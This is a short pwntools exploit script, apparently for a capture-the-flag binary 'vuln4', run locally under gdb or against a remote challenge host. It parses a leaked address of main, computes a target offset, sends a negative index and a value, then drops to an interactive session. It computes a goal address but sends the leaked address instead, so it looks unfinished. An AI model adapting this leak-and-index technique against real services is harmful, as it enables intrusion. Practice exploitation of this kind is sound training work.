from pwn import *
from struct import pack
local = True
elf = ELF('./vuln4')

if local:
    p = gdb.debug('./vuln4',"continue")
else:
    host = 'spclr.ch'
    port = 1260
    p = remote(host, port)

print(p.recvuntil(b'am: '))
leaked_main = int(p.recvline()[:-1], 16)
print('Leaked main: ', hex(leaked_main))

offset = 320
goal_address = leaked_main + offset

print('Goal address: ', hex(goal_address)) 
print(p.recv())
p.sendline(b'-2')
print(p.recv())
p.sendline(str(leaked_main).encode())
p.interactive()
